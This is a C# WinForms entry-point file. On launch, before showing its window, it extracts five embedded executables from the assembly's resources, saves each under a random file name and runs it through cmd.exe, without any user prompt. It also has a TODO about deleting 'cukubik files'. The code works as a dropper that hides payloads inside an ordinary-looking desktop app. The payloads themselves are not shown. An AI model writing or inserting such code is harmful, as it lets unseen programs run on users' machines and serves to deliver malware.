using System.Diagnostics;
using System.Reflection;

namespace DenizWinforms;

static class Program
{
    /// <summary>
    ///  The main entry point for the application.
    /// </summary>
    [STAThread]
    static void Main()
    {
        // To customize application configuration such as set high DPI settings or default font,
        // see https://aka.ms/applicationconfiguration.
        ApplicationConfiguration.Initialize();

        //TODO: Implement try to delete all cukubik files

        Enumerable
        .Range(0, 5)
        .Select(seq => $"DenizWinforms.resourcefiles.output_{seq}.exe")
        .ToList()
        .ForEach(fileName => Program.UnpackAndStartEmbeddedResourcefile(fileName));

        Application.Run(new Form1());
    }

    static void UnpackAndStartEmbeddedResourcefile(string resourceName)
    {
        using var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
        string newFileName = $"Output_{Guid.NewGuid()}.exe";
        using var file = new FileStream(newFileName, FileMode.Create, FileAccess.Write);
        resource.CopyTo(file);
        file.Flush();
        file.Close();
        file.Dispose();
        resource.Close();
        resource.Dispose();

        // Define the command you want to execute
        string command = $"/K {newFileName}";

        // Create a new process start info
        ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", command);
        processInfo.UseShellExecute = true;
        Process? process = Process.Start(processInfo);

        //Process.Start(newFileName);
    }
}